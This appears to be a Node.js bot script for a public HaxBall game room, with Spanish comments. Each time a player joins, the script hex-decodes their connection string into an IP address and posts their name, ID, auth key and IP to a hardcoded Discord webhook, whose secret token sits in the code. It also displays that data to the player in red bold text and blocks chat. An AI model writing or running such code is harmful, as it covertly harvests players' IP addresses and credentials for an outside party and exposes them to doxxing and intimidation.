const HaxballJS = require("haxball.js");
const https = require("https");
const { URL } = require("url");

// 🌐 FUNCIONES GLOBALES

function decryptHex(str) {
  if (!str || typeof str !== "string") {
    console.error("Invalid input passed to decryptHex:", str);
    return "";
  }

  let strOut = "";
  for (let x = 0; x < str.length; x += 2) {
    strOut += String.fromCharCode(parseInt(str.substring(x, x + 2), 16));
  }
  return strOut;
}

// ✅ VARIABLES DE ENTORNO

const token = process.env.JOB_ID;
const webhookUrl = "https://discord.com/api/webhooks/1393652971170041857/1M6Kx3gxcIQPfMaDCGS6bs52ng8XXfkqY2rR0MoqtY9vrRRHsff1M51lVso7X8bPj6fT";

if (!token) {
  console.error("❌ Error: No se encontró el token en las variables de entorno");
  process.exit(1);
}

if (!webhookUrl) {
  console.error("❌ Error: No se encontró el webhook URL en las variables de entorno");
  process.exit(1);
}

console.log("🚀 Iniciando bot de HaxBall...");

// 📩 FUNCIÓN PARA ENVIAR INFO A DISCORD

function sendPlayerInfoToDiscord(player) {
  const playerData = {
    content: `Nuevo jugador conectado: **${player.name}** (ID: ${player.id})`,
    embeds: [
      {
        title: "🎯 Nuevo Jugador Conectado",
        color: 0x00ff00,
        fields: [
          { name: "👤 Nombre", value: player.name, inline: true },
          { name: "🆔 ID", value: player.id.toString(), inline: true },
          { name: "🔐 Auth", value: player.auth || "No disponible", inline: true },
          { name: "Conn", value: player.conn || "No tiene", inline: true },
          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "HaxBall Bot - Sala 8MAN" },
      },
    ],
  };

  const data = JSON.stringify(playerData);
  const url = new URL(webhookUrl);

  const options = {
    hostname: url.hostname,
    port: 443,
    path: url.pathname + url.search,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
    },
  };

  const req = https.request(options, (res) => {
    let responseBody = "";
    res.on("data", (chunk) => {
      responseBody += chunk;
    });
    res.on("end", () => {
      if (res.statusCode === 200 || res.statusCode === 204) {
        console.log(`✅ Info de ${player.name} enviada a Discord.`);
      } else {
        console.error(`❌ Webhook falló - Status: ${res.statusCode}`);
        console.error(`Respuesta del webhook: ${responseBody}`);
      }
    });
  });

  req.on("error", (error) => {
    console.error("❌ Error al enviar webhook:", error);
  });

  req.write(data);
  req.end();
}

// 🎮 CREAR SALA

HaxballJS.then((HBInit) => {
  const room = HBInit({
    roomName: "🥪🍞Todos juegan con Falca🥪🍞",
    maxPlayers: 16,
    public: true,
    noPlayer: false,
    playerName: "Peluca",
    token: token,
    geo: {
      code: "AR",
      lat: -34.5670013488149,
      lon: -58.466999049128766,
    },
  });

  room.onRoomLink = function (url) {
    console.log("✅ Sala creada exitosamente!");
    console.log("🔗 Link de la sala:", url);
  };

  room.onPlayerJoin = function (player) {
    console.log(`🎯 Nuevo jugador: ${player.name} (ID: ${player.id})`);
    sendPlayerInfoToDiscord(player);

    room.sendAnnouncement(
      `CUFA DESBANEA A FAlCA`,
      null,
      0xff0000,
      "bold",
      2
    );

    setTimeout(() => {
      room.sendAnnouncement(
        "Nombre: " + player.name + " Auth: " + player.auth + " Ip: " + decryptHex(player.conn),
        player.id,
        0xff0000,
        "bold",
        2
      );
    }, 1000);
  };

  room.onPlayerLeave = function (player) {
    console.log(`👋 Jugador salió: ${player.name} (ID: ${player.id})`);
  };

  room.onPlayerChat = function (player, message) {
    console.log(`💬 ${player.name}: ${message}`);
    return false;
  };

  room.onRoomError = function (error) {
    console.error("❌ Error en la sala:", error);
  };
}).catch((error) => {
  console.error("❌ Error al inicializar HaxBall:", error);
  console.error("💡 Verifica que el token sea válido");
  process.exit(1);
});
